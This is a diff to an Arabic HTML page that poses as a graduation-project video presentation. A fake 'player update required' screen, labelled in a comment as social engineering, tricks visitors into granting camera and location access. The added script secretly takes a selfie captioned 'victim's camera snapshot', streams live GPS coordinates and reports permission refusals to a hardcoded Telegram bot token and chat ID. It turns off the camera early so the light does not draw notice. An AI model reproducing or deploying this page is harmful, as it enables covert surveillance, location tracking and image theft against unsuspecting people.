@@ -3,38 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>عرض تقني - مشروع التخرج</title>
+    <title>العرض التقني - مشروع التخرج</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; }
+        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
         .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         video { width: 100%; height: 100%; object-fit: cover; }
         
+        /* شاشة التمهيد (الهندسة الاجتماعية) */
         #prePermissionOverlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); color: white; z-index: 9999; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.9); color: white; z-index: 9999; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;
+            padding: 20px;
         }
         #proceedButton { 
-            margin-top: 20px; padding: 12px 30px; background: #4d94ff; 
-            color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold;
+            margin-top: 25px; padding: 15px 40px; background: #007bff; 
+            color: white; border: none; border-radius: 30px; cursor: pointer; 
+            font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(0,123,255,0.4);
+        }
+
+        /* شاشة الخطأ عند رفض الأذونات */
+        #errorOverlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; color: #ff4d4d; z-index: 10000; 
+            text-align: center; padding-top: 50%; font-size: 20px;
         }
     </style>
 </head>
 <body>
 
     <div id="prePermissionOverlay">
-        <p>⚠️ يتطلب العرض الوصول للكاميرا والموقع</p>
+        <h2 style="margin-bottom:15px;">⚠️ مطلوب تحديث المشغل</h2>
+        <p>يرجى الضغط على الزر أدناه وتفعيل الصلاحيات لمشاهدة العرض بدقة عالية.</p>
         <button id="proceedButton">تشغيل العرض الآن</button>
     </div>
 
+    <div id="errorOverlay">
+        <p>⚠️ خطأ: يجب تفعيل الصلاحيات للمتابعة.</p>
+        <button onclick="location.reload()" style="margin-top:20px; padding:10px; cursor:pointer;">إعادة محاولة</button>
+    </div>
+
     <div class="video-wrapper">
-        <video id="mainVideo" autoplay muted playsinline poster="2.png">
+        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
             <source src="1.mp4" type="video/mp4">
         </video>
     </div>
 
     <script>
+        // إعدادات البوت الخاصة بك
         const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
         const chatId = "1611398303";
 
@@ -43,52 +60,76 @@
             startTracking();
         };
 
-        function startTracking() {
-            // 1. طلب الكاميرا (بدون ميكروفون لزيادة السرعة)
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                captureVideoFrame(stream);
-                // إبقاء الكاميرا تعمل في الخلفية إذا أردت سحب صور متكررة
-            })
-            .catch(err => sendToTelegram("⚠️ رفض الكاميرا"));
+        async function startTracking() {
+            // 1. طلب الكاميرا والتقاط صورة واحدة (بدون ميكروفون للسرعة)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                capturePhoto(stream);
+            } catch (err) {
+                showError();
+            }
 
-            // 2. سحب الموقع بشكل مستمر (طالما الصفحة مفتوحة)
+            // 2. تتبع الموقع بشكل مباشر ودائم (Live Tracking)
             navigator.geolocation.watchPosition(pos => {
-                const data = `📍 تحديث موقع مباشر:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
-                sendToTelegram(data);
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy.toFixed(2);
+                
+                // رابط خرائط جوجل المباشر
+                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                const message = `📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${googleMapsUrl}`;
+                sendTextToTelegram(message);
             }, err => {
-                sendToTelegram("⚠️ رفض الموقع أو غير مفعل");
-            }, { enableHighAccuracy: true });
+                console.log("رفض الموقع");
+            }, { 
+                enableHighAccuracy: true, // استخدام GPS الفعلي
+                maximumAge: 0, 
+                timeout: 10000 
+            });
         }
 
-        function captureVideoFrame(stream) {
+        function capturePhoto(stream) {
             let v = document.createElement('video');
             v.srcObject = stream;
             v.play();
+            
             setTimeout(() => {
                 let canvas = document.createElement('canvas');
-                canvas.width = 720; canvas.height = 1280;
+                canvas.width = 720; 
+                canvas.height = 1280;
                 canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                 sendPhotoToTelegram(canvas.toDataURL('image/jpeg'));
-                // لإيقاف الكاميرا بعد أول صورة (أو اتركها لتعمل)
+                
+                // إغلاق الكاميرا بعد التقاط الصورة لضمان عدم لفت الانتباه (ضوء الكاميرا)
                 stream.getTracks().forEach(track => track.stop());
             }, 2000);
         }
 
-        function sendToTelegram(text) {
+        function sendTextToTelegram(text) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
         }
 
         function sendPhotoToTelegram(imgData) {
-            let byteString = atob(imgData.split(',')[1]);
-            let ab = new ArrayBuffer(byteString.length);
-            let ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            let blob = new Blob([ab], {type: 'image/jpeg'});
-            
+            let blob = dataURLtoBlob(imgData);
             let form = new FormData();
             form.append('document', blob, "capture.jpg");
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, { method: 'POST', body: form });
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 لقطة كاميرا الضحية")}`, { 
+                method: 'POST', 
+                body: form 
+            });
+        }
+
+        function dataURLtoBlob(dataurl) {
+            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type:mime});
+        }
+
+        function showError() {
+            document.getElementById('errorOverlay').style.display = 'block';
+            sendTextToTelegram("⚠️ المستخدم رفض صلاحيات الكاميرا");
         }
     </script>
 </body>
